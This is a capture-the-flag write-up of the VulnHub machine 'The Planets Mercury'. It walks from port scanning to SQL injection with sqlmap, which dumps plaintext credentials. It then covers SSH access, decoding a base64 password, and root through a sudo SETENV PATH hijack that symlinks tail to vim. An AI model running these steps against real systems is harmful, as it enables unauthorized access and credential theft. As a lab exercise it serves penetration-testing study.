---
title: Vulnhub - The Planets Mercury
description: My writeup on The Planets Mercury box.
categories:
 - vulnhub
tags: vulnhub sqlmap sqli sudo
---

![](https://i.pinimg.com/originals/f0/95/97/f095972de1a5052f7568d673edd66a46.jpg)

You can find the machine there > [The Planets Mercury](https://www.vulnhub.com/entry/the-planets-mercury,544/){:target="_blank"}

## Summary

This machine is quite easy, i have to admit that i stuck on privilege escalation for a while. Starting off with a sqlmap scan on the page we can grab some creds and ssh with them, this will give us a low-privilege shell on the box. Second privesc is really easy we just have to decode some base64 data & the final privesc to root is tricky we have to think smart to exploit it.
Let's start! :sunglasses:

## Enumeration/Reconnaissance

Let's start as always with nmap.

```
$ ip=192.168.1.19
$ nmap -p- --min-rate 10000 $ip
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-13 20:22 EEST
Nmap scan report for mercury.zte.com.cn (192.168.1.19)
Host is up (0.00016s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy
MAC Address: 08:00:27:C8:E8:0A (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.23 seconds
$ nmap -p 22,8080 -sC -sV -oN nmap/initial $ip
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-13 20:22 EEST
Nmap scan report for mercury.zte.com.cn (192.168.1.19)
Host is up (0.00059s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http-proxy WSGIServer/0.2 CPython/3.8.2
```

Let's start the enumeration on port `8080`, i couldn't find something interesting, only this message:

`Hello. This site is currently in development please check back later.`

On `/robots.txt` too:

```
User-agent: * 
Disallow: /
```

Next step is to run a `gobuster` scan on it, but i didn't find anything:

```
$ gobuster dir -q -u http://$ip:8080/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt,html -o gobuster.txt
/robots.txt (Status: 200)
```

Anyway, i was testing different things on URL and i noticed that on the `Page not found (404)` error provide us a path:

```
Using the URLconf defined in mercury_proj.urls, Django tried these URL patterns, in this order:

[name='index']
robots.txt [name='robots']
mercuryfacts/
```

I browsed `/mercuryfacts` path & i noticed this message `Fact id: 1. (('Mercury does not have any moons or rings.',),)` under `Mercury Facts` link. Voilà! We can test for SQL Injection. Let's fire up sqlmap! :fire:

## Shell as webmaster

```
$ sqlmap -u http://192.168.1.19:8080/mercuryfacts/ --dbs --batch
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.4.5#stable}
|_ -| . [,]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

..data..

[21:30:48] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.1
[21:30:49] [INFO] fetching database names
[21:30:49] [INFO] retrieved: 'information_schema'
[21:30:49] [INFO] retrieved: 'mercury'
available databases [2]:                                                                                                                                                           
[*] information_schema
[*] mercury
```

Here we go, let's grab the tables now.

```
sqlmap -u http://192.168.1.19:8080/mercuryfacts/ -D mercury --tables --batch
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.4.5#stable}
|_ -| . ["]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

..data..

[21:33:32] [INFO] retrieved: 'facts'
[21:33:32] [INFO] retrieved: 'users'
Database: mercury                                                                                                                                                                  
[2 tables]
+-------+
| facts |
| users |
+-------+
```

Let's get the data now from the `users` table.

```
$ sqlmap -u http://192.168.1.19:8080/mercuryfacts/ -D mercury -T users --dump --batch
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.4.5#stable}
|_ -| . ["]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

..data..

Database: mercury                                                                                                                                                                  
Table: users
[4 entries]
+------+-----------+-------------------------------+
| id   | username  | password                      |
+------+-----------+-------------------------------+
| 1    | john      | johnny1987                    |
| 2    | laura     | lovemykids111                 |
| 3    | sam       | lovemybeer111                 |
| 4    | webmaster | mercuryisthesizeof0.056Earths |
+------+-----------+-------------------------------+
```

After some tries i found the right creds, `webmaster:mercuryisthesizeof0.056Earths` & we have shell.

```
$ ssh webmaster@$ip
webmaster@192.168.1.19's password: 

webmaster@mercury:~$ whoami;id
webmaster
uid=1001(webmaster) gid=1001(webmaster) groups=1001(webmaster)
```

## Shell as linuxmaster

Enumerating the home folder, i noticed a directory called `mercury_proj`. I entered the directory and i found out 2 accounts under `notes.txt`:

```
Project accounts (both restricted):
webmaster for web stuff - webmaster:bWVyY3VyeWlzdGhlc2l6ZW9mMC4wNTZFYXJ0aHMK
linuxmaster for linux stuff - linuxmaster:bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg==
```

I base64 decoded `linuxmaster` password and i got access!

```
webmaster@mercury:~/mercury_proj$ echo bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg== | base64 -d
mercurymeandiameteris4880km
webmaster@mercury:~/mercury_proj$ su - linuxmaster
Password: 
linuxmaster@mercury:~$ whoami;id
linuxmaster
uid=1002(linuxmaster) gid=1002(linuxmaster) groups=1002(linuxmaster),1003(viewsyslog)
```

## Shell as root

Doing the basic enumeration, i always check `sudo -l` what we can run as root:

```
linuxmaster@mercury:~$ sudo -l
[sudo] password for linuxmaster: 
Matching Defaults entries for linuxmaster on mercury:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User linuxmaster may run the following commands on mercury:
    (root : root) SETENV: /usr/bin/check_syslog.sh
```

We can run this file as root, interesting. We can notice the `SETENV` tag to be honest first time i see this after some google-fu i found that this tag allow users to preserve environment variables.

Let's see the code of `check_syslog.sh` file.

```bash
#!/bin/bash
tail -n 10 /var/log/syslog
```

Runs the `tail` command on `syslog` file. We can do a trick here and make symlink on tail to point on vim.

```
linuxmaster@mercury:~$ ln -s /usr/bin/vim tail
linuxmaster@mercury:~$ ls -la tail
lrwxrwxrwx 1 linuxmaster linuxmaster 12 Sep 13 19:04 tail -> /usr/bin/vim
```

Perfect, now let's change the PATH.

```
linuxmaster@mercury:~$ export PATH=$(pwd):$PATH
linuxmaster@mercury:~$ echo $PATH
/home/linuxmaster:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```

We can use now the `--preserve-env` to set our environment variables.

```
linuxmaster@mercury:~$ sudo --preserve-env=PATH /usr/bin/check_syslog.sh 
```

This will load vim and we can run `:!bash` and we have root shell! :boom:

```
root@mercury:/home/linuxmaster# whoami;id
root
uid=0(root) gid=0(root) groups=0(root)
```

Let's read the flags now.

```
root@mercury:~# cat /home/webmaster/user_flag.txt 
[user_flag_8339915c9a454657bd60ee58776f4ccd]

root@mercury:~# cat root_flag.txt 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@/##////////@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@(((/(*(/((((((////////&@@@@@@@@@@@@@
@@@@@@@@@@@((#(#(###((##//(((/(/(((*((//@@@@@@@@@@
@@@@@@@@/#(((#((((((/(/,*/(((///////(/*/*/#@@@@@@@
@@@@@@*((####((///*//(///*(/*//((/(((//**/((&@@@@@
@@@@@/(/(((##/*((//(#(////(((((/(///(((((///(*@@@@
@@@@/(//((((#(((((*///*/(/(/(((/((////(/*/*(///@@@
@@@//**/(/(#(#(##((/(((((/(**//////////((//((*/#@@
@@@(//(/((((((#((((#*/((///((///((//////(/(/(*(/@@
@@@((//((((/((((#(/(/((/(/(((((#((((((/(/((/////@@
@@@(((/(((/##((#((/*///((/((/((##((/(/(/((((((/*@@
@@@(((/(##/#(((##((/((((((/(##(/##(#((/((((#((*%@@
@@@@(///(#(((((#(#(((((#(//((#((###((/(((((/(//@@@
@@@@@(/*/(##(/(###(((#((((/((####/((((///((((/@@@@
@@@@@@%//((((#############((((/((/(/(*/(((((@@@@@@
@@@@@@@@%#(((############(##((#((*//(/(*//@@@@@@@@
@@@@@@@@@@@/(#(####(###/((((((#(///((//(@@@@@@@@@@
@@@@@@@@@@@@@@@(((###((#(#(((/((///*@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@%#(#%@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@

Congratulations on completing Mercury!!!
If you have any feedback please contact me at SirFlash@protonmail.com
[root_flag_69426d9fda579afbffd9c2d47ca31d90]
```

I enjoyed this box very much & i learnt some new things. See you! :simple_smile:



